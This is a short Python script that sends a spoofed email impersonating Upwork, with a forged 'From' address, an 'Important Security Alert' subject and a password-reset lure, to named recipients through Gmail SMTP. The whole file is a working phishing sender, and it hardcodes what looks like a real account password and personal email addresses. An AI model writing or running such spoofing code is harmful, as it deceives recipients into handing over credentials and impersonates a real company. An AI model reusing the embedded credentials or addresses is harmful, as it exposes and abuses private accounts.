import smtplib  # Import the smtplib library to send emails

# Define the email parameters

# The spoofed 'From' address - this is what will appear as the sender's email
from_address = "donotreply=upwork.com@mg.upwork.com"

# The target email address - the recipient of the spoofed email
to_address = "andersonclarkson41@gmail.com", "omotayoolaolekan01@outlook.com"

# SMTP server details - this is where the email will be sent through
# Note: You should replace these with actual SMTP server details you have access to
smtp_server = "smtp.gmail.com"  # Example SMTP server (Mailtrap used for safe testing)
smtp_port = 587  # Common SMTP port for STARTTLS (others are 25 for non-secure and 465 for SSL)
smtp_user = "omotayoolaolekan01@gmail.com"  # Your SMTP server username (replace with actual)
smtp_password = "yxmo imgm ibpt uwfr"  # Your SMTP server password (replace with actual)

# Define the content of the email
subject = "Important Security Alert"  # The subject of the email
body = """
Dear user,

Please reset your password immediately using the following link: https://www.google.com

Best regards,
Your IT Team
"""

# Combine the headers and the body into a single message
email_message = f"From: {from_address}\nTo: {to_address}\nSubject: {subject}\n\n{body}"

# Connect to the SMTP server and send the email
try:
    # Initialize connection to the SMTP server
    server = smtplib.SMTP(smtp_server, smtp_port)

    # Upgrade the connection to secure using STARTTLS
    server.starttls()

    # Login to the SMTP server using the provided credentials
    server.login(smtp_user, smtp_password)

    # Send the email
    server.sendmail(from_address, to_address, email_message)

    # Print success message if the email is sent
    print("Email sent successfully!")

except Exception as e:
    # Print error message if something goes wrong
    print(f"Failed to send email: {e}")

finally:
    # Close the connection to the SMTP server
    server.quit()